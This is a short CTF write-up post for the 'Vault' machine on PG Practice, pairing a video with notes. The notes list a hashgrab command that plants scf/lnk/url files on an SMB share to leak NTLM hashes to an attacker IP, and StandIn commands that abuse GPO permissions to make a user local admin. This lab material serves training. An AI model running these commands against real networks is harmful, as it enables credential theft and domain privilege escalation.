---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/fRbVdbY1d28/0.jpg
layout: post
media_subpath: /assets/posts/2021-12-05-stealing-hashes-with-responder-gpo-permissions-unintended-ways-vault-pg-practice
tags:
- active directory
- gpo
- pg practice
- responder
- windows
title: Stealing Hashes with Responder, GPO Permissions & Unintended Ways - Vault @ PG Practice
---

We are solving Vault from PG Practice. This machine involves planting malicious files on an SMB share to steal hashes. For root, we will abuse GPO Permissions and explore 2 unintended privilege escalations.

{% youtube fRbVdbY1d28 %}

## Notes

**Creating scf/lnk/url files via** [hashgrab](https://github.com/xct/hashgrab)**:**

```
python3 ~/tools/hashgrab/hashgrab.py <ip> xct
```

**GPO Abuse** **via** [standin](https://github.com/FuzzySecurity/StandIn)**:**

```
.\standin --gpo
.\standin --gpo --filter "Default Domain Policy" --acl
.\standin --gpo --filter "Default Domain Policy" --localadmin anirudh
cmd /c "gpupdate /force"
```

**Other resources:**

- <https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1>
- <https://github.com/xct/SeRestoreAbuse>